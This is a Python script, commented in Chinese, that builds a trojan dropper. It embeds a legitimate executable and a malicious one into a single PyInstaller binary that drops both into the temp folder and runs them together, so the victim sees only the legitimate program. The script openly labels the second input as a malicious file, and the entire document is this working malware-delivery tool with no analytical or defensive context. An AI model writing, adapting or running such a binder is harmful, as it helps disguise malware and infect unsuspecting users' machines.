import argparse
import subprocess
import os
import shutil

def create_bundler_script(legit_path, evil_path, output_path):
    script_content = f"""
import subprocess
import os
import tempfile

def execute_program(path):
    try:
        subprocess.Popen(path, shell=True)
    except Exception as e:
        print(f"执行 {{path}} 时出错：{{e}}")

def main():
    legit_path = os.path.join(tempfile.gettempdir(), "legit.exe")
    evil_path = os.path.join(tempfile.gettempdir(), "evil.exe")

    with open(legit_path, 'wb') as f:
        f.write({read_file(legit_path)})

    with open(evil_path, 'wb') as f:
        f.write({read_file(evil_path)})

    execute_program(legit_path)
    execute_program(evil_path)

if __name__ == "__main__":
    main()
"""
    with open(output_path, 'w') as script_file:
        script_file.write(script_content)

def read_file(file_path):
    with open(file_path, 'rb') as file:
        return file.read()

def bundle_files(legit_file, evil_file, output_file):
    bundle_script = "bundler.py"
    create_bundler_script(legit_file, evil_file, bundle_script)

    pyinstaller_command = [
        "pyinstaller",
        "--onefile",
        bundle_script,
        "--distpath",
        os.path.dirname(output_file),
        "--name",
        os.path.basename(output_file)
    ]

    subprocess.run(pyinstaller_command)

    # 清理生成的临时文件
    os.remove(bundle_script)
    shutil.rmtree("build")
    shutil.rmtree("dist")
    os.remove(f"{os.path.basename(bundle_script).replace('.py', '.spec')}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='文件捆绑器：将合法文件与恶意文件捆绑')
    parser.add_argument('--legit', required=True, help='合法文件路径')
    parser.add_argument('--evil', required=True, help='恶意文件路径')
    parser.add_argument('--output', required=True, help='捆绑后的文件路径')
    args = parser.parse_args()

    if not os.path.exists(args.legit):
        print(f"合法文件不存在：{args.legit}")
        exit(1)
    if not os.path.exists(args.evil):
        print(f"恶意文件不存在：{args.evil}")
        exit(1)

    bundle_files(args.legit, args.evil, args.output)
